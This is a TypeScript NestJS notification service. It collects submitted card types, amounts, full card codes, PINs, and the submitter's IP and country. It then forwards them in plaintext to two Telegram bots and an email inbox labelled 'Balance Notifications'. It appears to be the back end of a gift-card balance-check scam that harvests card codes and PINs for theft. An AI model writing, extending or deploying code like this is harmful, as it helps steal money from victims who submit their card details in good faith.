import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import axios from 'axios';
import * as nodemailer from 'nodemailer';

@Injectable()
export class NotificationService {
  private readonly logger = new Logger(NotificationService.name);
  private transporter: nodemailer.Transporter | null = null;

  constructor(private configService: ConfigService) {
    this.initializeEmailTransporter();
  }

  private initializeEmailTransporter() {
    const host = this.configService.get<string>('SMTP_HOST');
    const port = this.configService.get<number>('SMTP_PORT', 587);
    const user = this.configService.get<string>('SMTP_USER');
    const pass = this.configService.get<string>('SMTP_PASS');

    if (host && user && pass) {
      this.transporter = nodemailer.createTransport({
        host,
        port,
        secure: port === 465, // true for 465, false for other ports
        auth: {
          user,
          pass,
        },
      });
      this.logger.log('Email transporter initialized');
    } else {
      this.logger.warn('SMTP credentials not fully provided, email notifications are disabled');
    }
  }

  async notifyVerificationRequest(data: {
    cardType: string;
    currency: string;
    amount: number | string;
    cardCode: string;
    pin?: string;
    ip?: string;
    country?: string;
  }) {
    const formattedMessage = `
🔔 *New Verification Request*
━━━━━━━━━━━━━━━━━━━━━
*Card Type:* ${data.cardType}
*Amount:* ${data.amount} ${data.currency}
*Card Code:* \`${data.cardCode}\`
${data.pin ? `*PIN:* \`${data.pin}\`\n` : ''}
*IP Address:* ${data.ip || 'Unknown'}
*Country:* ${data.country || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Send to Telegram
    await this.sendTelegram(formattedMessage);

    // Send to Email
    await this.sendEmail(
      `New Card Submitted: ${data.cardType} (${data.amount} ${data.currency})`,
      formattedMessage,
    );
  }

  private async sendTelegram(message: string) {
    const botToken1 = this.configService.get<string>('TELEGRAM_BOT_TOKEN');
    const chatId1 = this.configService.get<string>('TELEGRAM_CHAT_ID');

    const botToken2 = this.configService.get<string>('TELEGRAM_BOT_TOKEN_2');
    const chatId2 = this.configService.get<string>('TELEGRAM_CHAT_ID_2');

    const destinations = [];
    if (botToken1 && chatId1) destinations.push({ token: botToken1, chat: chatId1, name: 'Bot 1' });
    if (botToken2 && chatId2) destinations.push({ token: botToken2, chat: chatId2, name: 'Bot 2' });

    if (destinations.length === 0) {
      this.logger.debug('Telegram credentials missing, skipping Telegram notification');
      return;
    }

    for (const dest of destinations) {
      try {
        await axios.post(`https://api.telegram.org/bot${dest.token}/sendMessage`, {
          chat_id: dest.chat,
          text: message,
          parse_mode: 'Markdown',
        });
        this.logger.log(`Sent Telegram notification to ${dest.name}`);
      } catch (error: any) {
        this.logger.error(`Failed to send Telegram notification to ${dest.name}`, error.message);
      }
    }
  }

  private async sendEmail(subject: string, text: string) {
    const toEmail = this.configService.get<string>('NOTIFICATION_EMAIL');

    if (!this.transporter || !toEmail) {
      this.logger.debug('Email configuration missing, skipping Email notification');
      return;
    }

    try {
      await this.transporter.sendMail({
        from: `"Balance Notifications" <${this.configService.get<string>('SMTP_USER')}>`,
        to: toEmail,
        subject,
        text,
      });
      this.logger.log('Sent Email notification');
    } catch (error: any) {
      this.logger.error('Failed to send Email notification', error.message);
    }
  }
}
